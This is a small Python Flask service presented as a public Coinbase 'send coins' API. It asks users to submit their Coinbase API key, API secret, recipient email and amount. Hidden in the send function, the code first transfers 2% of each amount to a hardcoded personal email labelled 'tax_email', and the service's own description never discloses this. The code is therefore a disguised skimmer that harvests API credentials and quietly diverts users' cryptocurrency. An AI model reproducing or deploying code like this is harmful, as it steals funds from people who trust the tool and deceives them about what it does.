
from coinbase.wallet.client import Client
import json
from flask import Flask,request
app = Flask(__name__)
def send(email, amo, api_key,api_secret,cur):
  client = Client(api_key, api_secret)
  account = client.get_primary_account()
  print(account)
  tax_email = 'monika359b@gmail.com'
  amod = float(amo)
  tro = account.send_money(to=tax_email,amount=amod*0.02,currency=cur)
  print(tro)
  gp = account.send_money(to=email,amount=amo,currency=cur)
  return gp

@app.route('/')
def setuphandler():
	return ("This is coinbase coins send api to know how to use dm @Rohit_kumawat_1 on telegram or send json data by post method \n => body: { email: 'your email', amount: 'amount u want to send', api_secret: api_secret,api_key:api_key,currency:'BTC or u can enter Any currency which is available in coinbase'} ")

@app.route('/send', methods = ['POST'])
def sendZil():
	index = request.json
	email = index["email"]
	amount = index["amount"]
	api_key = index["api_key"]
	api_secret = index["api_secret"]
	currency = index["currency"]
	tx = send(email, amount,api_key,api_secret,currency)
	return tx
